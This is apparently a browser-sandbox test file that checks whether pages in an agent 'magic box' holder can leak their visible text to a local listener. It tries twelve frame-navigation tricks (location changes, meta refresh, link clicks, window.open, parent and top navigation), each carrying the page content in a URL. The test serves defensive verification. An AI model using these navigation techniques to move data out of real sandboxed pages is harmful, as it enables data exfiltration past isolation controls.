// An agent's page in the magic box sends nothing to the network by sending its
// own frame somewhere, in a real Chrome with a throwaway profile. Each page is
// built as the board builds it (MagicBox.pageDoc in its holder,
// MagicBox.holderDoc, in a frame sealed with PAGE_SANDBOX) and tries one way
// of moving a frame to an outside listener, with what it shows in the address.
// The listener hears nothing, and every page still runs and is heard through
// its holder. The same pages without the holder do reach the listener, which
// is what the holder is for.
const assert = require("node:assert/strict");
const { after, before, test } = require("node:test");
const { createServer } = require("node:http");
const { mkdtemp, readFile, rm } = require("node:fs/promises");
const { tmpdir } = require("node:os");
const path = require("node:path");
const puppeteer = require("puppeteer-core");

const CHROME = process.env.CHROME_PATH || "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
const ROOT = path.join(__dirname, "..");

// each way, run in the page 300 ms after it has loaded and said its word, with
// U the outside address
const WAYS = {
  href: "location.href = U",
  assign: "location.assign(U)",
  replace: "location.replace(U)",
  refresh: "const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + U; document.head.append(m)",
  link: "const a = document.createElement('a'); a.href = U; document.body.append(a); a.click()",
  openSelf: "window.open(U, '_self')",
  openByName: "window.name = 'me'; window.open(U, 'me')",
  navigation: "navigation.navigate(U)",
  parent: "try { parent.location.href = U } catch (_) {}",
  top: "try { top.location.href = U } catch (_) {}",
  linkParent: "const a = document.createElement('a'); a.href = U; a.target = '_parent'; document.body.append(a); a.click()",
  childFrame: "const c = document.createElement('iframe'); c.srcdoc = '<script>location.href = ' + JSON.stringify(U) + '<\\/script>'; document.body.append(c)",
};

let site, listener, heard, browser, profile, origin, outside;

const pageOf = way => `<p>The owner's note: 4242</p><script>
const U = "${outside}/hit?way=${way}&shown=" + encodeURIComponent(document.body.innerText);
addEventListener("load", () => setTimeout(() => { ${WAYS[way]} }, 300));</script>`;

// the board's side: each page in its frame, and what each frame says
const board = (held, pages) => `<!doctype html><meta charset="utf-8"><script src="/magic-box.js"></script><body><script>
const pages = ${JSON.stringify(pages).replace(/</g, "\\u003c")};
window.said = {};
const frames = new Map();
addEventListener("message", e => { const way = frames.get(e.source); if (way) (said[way] = said[way] || []).push(e.data); });
for (const way of Object.keys(pages)) {
  const frame = document.createElement("iframe");
  frame.setAttribute("sandbox", MagicBox.PAGE_SANDBOX);
  frame.setAttribute("referrerpolicy", "no-referrer");
  const page = MagicBox.pageDoc(pages[way], "word-" + way, true);
  frame.srcdoc = ${held ? "MagicBox.holderDoc(page)" : "page"};
  document.body.append(frame);
  frames.set(frame.contentWindow, way);
}
</script>`;

before(async () => {
  heard = [];
  listener = createServer((req, res) => { heard.push(new URL(req.url, "http://x").searchParams.get("way")); res.end("outside"); });
  await new Promise(resolve => listener.listen(0, "127.0.0.1", resolve));
  outside = `http://localhost:${listener.address().port}`;
  const code = await readFile(path.join(ROOT, "magic-box.js"));
  site = createServer((req, res) => {
    const url = new URL(req.url, "http://x");
    if (url.pathname === "/magic-box.js") { res.setHeader("Content-Type", "application/javascript"); return res.end(code); }
    const pages = Object.fromEntries(Object.keys(WAYS).map(way => [way, pageOf(way)]));
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.end(board(url.searchParams.get("held") === "1", pages));
  });
  await new Promise(resolve => site.listen(0, "127.0.0.1", resolve));
  origin = `http://127.0.0.1:${site.address().port}`;
  profile = await mkdtemp(path.join(tmpdir(), "facilitator-box-navigation-profile-"));
  browser = await puppeteer.launch({ executablePath: CHROME, headless: true, userDataDir: profile,
    args: ["--no-first-run", "--no-default-browser-check", "--disable-background-networking",
      "--use-mock-keychain", "--password-store=basic"] });
});

after(async () => {
  if (browser) await browser.close();
  if (site) await new Promise(resolve => site.close(resolve));
  if (listener) { listener.closeAllConnections(); await new Promise(resolve => listener.close(resolve)); }
  if (profile) await rm(profile, { recursive: true, force: true });
});

async function run(held) {
  heard.length = 0;
  const page = await browser.newPage();
  await page.goto(`${origin}/?held=${held ? 1 : 0}`, { waitUntil: "domcontentloaded" });
  await new Promise(resolve => setTimeout(resolve, 3000));
  const said = await page.evaluate(() => window.said);
  await page.close();
  return { said, reached: [...new Set(heard)].sort() };
}

test("a page in its holder reaches nothing outside, whichever way it moves its frame, and is still heard", async () => {
  const { said, reached } = await run(true);
  assert.deepEqual(reached, [], "the listener heard nothing");
  for (const way of Object.keys(WAYS)) {
    const words = said[way] || [];
    // the page's own load and its word, handed on by the holder, and nothing it posted lost
    assert.ok(words.includes("word-" + way), `${way}: the page ran and said its word`);
    assert.ok(words.includes(true), `${way}: the holder said the page loaded`);
  }
  // a page that tried to send its own frame away loads again without its word,
  // which the board takes as leaving and puts the page back
  for (const way of ["href", "assign", "replace", "refresh", "link", "openSelf", "openByName", "navigation"])
    assert.equal(said[way].filter(w => w === true).length, 2, `${way}: a second load the board hears`);
});

test("the same pages without the holder do reach the listener, so the test can see a leak", async () => {
  const { reached } = await run(false);
  for (const way of ["href", "assign", "replace", "refresh", "link", "openSelf", "openByName", "navigation"])
    assert.ok(reached.includes(way), `${way} reached the listener`);
  for (const way of ["parent", "top", "linkParent", "childFrame"])
    assert.ok(!reached.includes(way), `${way} is stopped by the seal itself`);
});
